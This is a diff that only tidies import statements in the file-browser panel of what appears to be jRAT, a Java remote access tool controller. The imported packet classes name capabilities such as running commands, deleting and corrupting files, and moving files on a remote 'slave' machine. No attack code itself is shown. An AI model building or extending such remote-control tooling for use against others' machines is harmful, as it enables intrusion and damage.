@@ -10,15 +10,7 @@ import jrat.controller.Slave;
 import jrat.controller.io.FileObject;
 import jrat.controller.io.FileSystem;
 import jrat.controller.listeners.DirListener;
-import jrat.controller.packets.outgoing.Packet15ListFiles;
-import jrat.controller.packets.outgoing.Packet16DeleteFile;
-import jrat.controller.packets.outgoing.Packet21ServerDownloadFile;
-import jrat.controller.packets.outgoing.Packet38RunCommand;
-import jrat.controller.packets.outgoing.Packet42ServerUploadFile;
-import jrat.controller.packets.outgoing.Packet43CreateDirectory;
-import jrat.controller.packets.outgoing.Packet47RenameFile;
-import jrat.controller.packets.outgoing.Packet64FileHash;
-import jrat.controller.packets.outgoing.Packet70CorruptFile;
+import jrat.controller.packets.outgoing.*;
 import jrat.controller.settings.StoreFileBookmarks;
 import jrat.controller.ui.components.FileTable;
 import jrat.controller.ui.frames.FramePreviewFile;
@@ -26,26 +18,17 @@ import jrat.controller.ui.frames.FramePreviewImage;
 import jrat.controller.ui.frames.FramePreviewZip;
 import jrat.controller.ui.frames.FrameRemoteFiles;
 import jrat.controller.utils.Utils;
-import java.awt.BorderLayout;
-import java.awt.Desktop;
+import oslib.OperatingSystem;
+
+import javax.swing.*;
+import javax.swing.event.PopupMenuEvent;
+import javax.swing.event.PopupMenuListener;
+import java.awt.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.io.File;
 import java.util.ArrayList;
 import java.util.List;
-import javax.swing.JButton;
-import javax.swing.JFileChooser;
-import javax.swing.JMenu;
-import javax.swing.JMenuItem;
-import javax.swing.JOptionPane;
-import javax.swing.JPanel;
-import javax.swing.JPopupMenu;
-import javax.swing.JSplitPane;
-import javax.swing.SwingUtilities;
-import javax.swing.event.PopupMenuEvent;
-import javax.swing.event.PopupMenuListener;
-
-import oslib.OperatingSystem;
 
 @SuppressWarnings("serial")
 public class PanelRemoteFiles extends JPanel {
